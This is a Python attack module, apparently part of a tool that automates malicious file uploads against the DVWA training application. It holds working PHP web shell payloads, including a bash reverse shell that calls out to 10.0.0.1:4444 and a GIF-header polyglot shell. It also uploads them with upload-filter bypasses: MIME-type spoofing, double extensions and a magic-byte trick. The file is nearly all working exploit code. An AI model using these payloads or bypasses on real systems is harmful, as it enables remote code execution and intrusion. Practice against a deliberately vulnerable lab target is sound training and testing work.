"""Malicious File Upload attack against DVWA."""

import io
import random
from .base import AttackModule, logger

PHP_SHELL = b'<?php echo shell_exec($_GET["cmd"]); ?>'
PHP_REVERSE = b'<?php system("/bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\'"); ?>'
GIF_PHP = b'GIF89a\n<?php echo shell_exec($_GET["cmd"]); ?>'


class FileUpload(AttackModule):
    NAME = "file_upload"

    def _upload(self, session, filename, content, content_type="application/x-php"):
        token = session.get_csrf_token("/vulnerabilities/upload/")
        session.post(
            "/vulnerabilities/upload/",
            files={"uploaded": (filename, io.BytesIO(content), content_type)},
            data={"Upload": "Upload", "user_token": token},
        )
        logger.debug("[file_upload] Uploaded %s (%s)", filename, content_type)

    def run_low(self, session):
        self._upload(session, "shell.php", PHP_SHELL)
        self._upload(session, "reverse.php", PHP_REVERSE)

    def run_medium(self, session):
        # Medium checks MIME type — spoof as image
        self._upload(session, "shell.php", PHP_SHELL, "image/jpeg")
        self._upload(session, "payload.php.jpg", PHP_SHELL, "image/jpeg")

    def run_high(self, session):
        # High checks extension — use GIF header trick
        self._upload(session, "shell.jpg", GIF_PHP, "image/jpeg")
        # Also try double extension
        self._upload(session, "shell.php.jpg", GIF_PHP, "image/jpeg")
